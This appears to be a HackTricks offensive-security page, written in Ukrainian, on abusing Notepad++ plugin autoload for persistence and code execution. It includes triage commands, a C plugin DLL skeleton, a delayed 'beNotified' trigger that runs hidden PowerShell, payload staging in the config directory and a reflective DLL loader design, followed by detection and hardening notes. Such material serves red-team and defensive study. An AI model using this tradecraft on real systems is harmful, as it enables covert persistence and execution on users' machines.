# Persistence та Execution через Autoload плагіна Notepad++

{{#include ../../banners/hacktricks-training.md}}

Notepad++ **автоматично завантажує кожну DLL плагіна, знайдену в його підпапках `plugins`**, під час запуску. Розміщення malicious plugin у будь-якій **доступній для запису інсталяції Notepad++** забезпечує code execution всередині `notepad++.exe` під час кожного запуску редактора. Це можна використати для **persistence**, прихованого **initial execution** або як **in-process loader**, якщо редактор запущено з підвищеними привілеями.<sup>[[1]](#references)</sup>

Починаючи з **Notepad++ 7.6+**, очікувана структура для manual installation передбачає **окрему підпапку для кожного плагіна** (`plugins\<PluginName>\<PluginName>.dll`). У **portable mode** (за наявності `doLocalConf.xml` поруч із `notepad++.exe`) усе дерево application залишається локальним у цій директорії. Через це скопійовані/admin tool bundles часто стають зручною execution surface, доступною для запису користувачем.<sup>[[2]](#references)</sup>

## Доступні для запису locations плагінів

- Standard install: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (зазвичай для запису потрібні права адміністратора).<sup>[[1]](#references)</sup>
- Доступні для запису варіанти для low-privileged operators:<sup>[[1]](#references)</sup>
- Використовуйте **portable build Notepad++** у директорії, доступній для запису користувачем.
- Скопіюйте `C:\Program Files\Notepad++` у path, контрольований користувачем (наприклад, `%LOCALAPPDATA%\npp\`), і запускайте `notepad++.exe` звідти.
- Шукайте **admin tool bundles**, розпаковані zip-копії або help-desk toolkits, які вже містять `doLocalConf.xml` і розташовані поза `Program Files`.
- Кожен плагін має власну підпапку в `plugins` і автоматично завантажується під час startup; записи меню з’являються в **Plugins**.<sup>[[2]](#references)</sup>

Швидкий triage:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Точки завантаження Plugin (примітиви виконання)
Notepad++ очікує наявності певних **експортованих функцій**. Усі вони викликаються під час ініціалізації, що створює кілька поверхонь виконання:<sup>[[1]](#references)</sup>
- **`DllMain`** — запускається одразу після завантаження DLL (перша точка виконання).
- **`setInfo(NppData)`** — викликається один раз під час завантаження для передавання дескрипторів Notepad++; типове місце для реєстрації пунктів меню.
- **`getName()`** — повертає назву Plugin, яка відображається в меню.
- **`getFuncsArray(int *nbF)`** — повертає команди меню; навіть якщо масив порожній, функція викликається під час запуску.
- **`beNotified(SCNotification*)`** — отримує події Notepad++ / Scintilla (корисно для відкладеного запуску payloads до дії користувача або події редактора).
- **`messageProc(UINT, WPARAM, LPARAM)`** — обробник повідомлень, корисний для обміну більшими обсягами даних.
- **`isUnicode()`** — прапорець сумісності, який перевіряється під час завантаження.

Більшість export-функцій можна реалізувати як **заглушки**; виконання може відбуватися з `DllMain` або будь-якого callback вище під час autoload.

## Мінімальний шкідливий каркас Plugin
Скомпілюйте DLL з очікуваними export-функціями та розмістіть її в `plugins\\MyNewPlugin\\MyNewPlugin.dll` у доступній для запису папці Notepad++:<sup>[[1]](#references)</sup>
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. Зберіть DLL (Visual Studio/MinGW).
2. Створіть підпапку плагіна в `plugins` і помістіть DLL усередину.
3. Перезапустіть Notepad++; DLL завантажується автоматично, виконуючи `DllMain` і подальші callbacks.

## Патерн тригера з низьким рівнем шуму через `beNotified`
Для OPSEC багато payloads не повинні запускатися з `DllMain`. Тихіший патерн полягає в тому, щоб плагін завантажувався коректно, а потім виконувався лише після реалістичної події редактора, наприклад **завершення запуску**, **активації буфера** або **введення першого символу**.
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
Це краще відповідає публічним offensive research, ніж гучний beacon у `DllMain`: DLL усе ще автоматично завантажується під час запуску, але шкідлива дія відкладається до моменту, коли Notepad++ справді починають використовувати.

## Використання каталогу конфігурації plugin як вторинного сховища
Notepad++ надає `NPPM_GETPLUGINSCONFIGDIR`, який повертає **каталог конфігурації plugin поточного користувача**.<sup>[[3]](#references)</sup> Шкідливий plugin може використовувати його, щоб зберігати мінімальну DLL на диску, а зашифровану конфігурацію, staged payloads або tasking files — у шляху, який не вирізняється серед звичайного стану plugin.
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Операційно це корисно, коли потрібно:
- невелику DLL bootstrap, що автоматично завантажується;
- tasking для окремого користувача без повторної зміни основного plugin binary;
- відокремити **autoload trigger** від важчої second stage.

## Reflective loader plugin pattern
Weaponized plugin може перетворити Notepad++ на **reflective DLL loader**:<sup>[[1]](#references)</sup>
- Надати мінімальний UI/menu entry (наприклад, "LoadDLL").
- Приймати **file path** або **URL** для отримання payload DLL.
- Виконати reflective mapping DLL у поточний process і викликати експортовану entry point (наприклад, loader function усередині отриманої DLL).
- Перевага: повторно використовувати GUI process, який виглядає легітимно, замість запуску нового loader; payload успадковує integrity `notepad++.exe` (включно з elevated contexts).
- Компроміси: запис **unsigned plugin DLL** на диск помітний; практичний варіант — використовувати autoloaded plugin лише як stub, а справжній implant зберігати encrypted/staged в іншому місці.

## Нотатки щодо виявлення та hardening
- Блокувати або моніторити **writes до Notepad++ plugin directories** (включно з portable copies у профілях користувачів); увімкнути controlled folder access або application allowlisting.
- Створити alert для **new unsigned DLLs** у `plugins`, змін у portable Notepad++ trees та нетипових **child processes/network activity** від `notepad++.exe`.
- Створити baseline легітимних plugins і досліджувати будь-яку нову DLL, яка експортує normal Notepad++ plugin interface, але також запускає shells, PowerShell або network beacons.
- Дозволяти plugin installation лише через **Plugins Admin** і обмежити execution portable copies з untrusted paths.

## References

- [1] [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [2] [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [3] [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
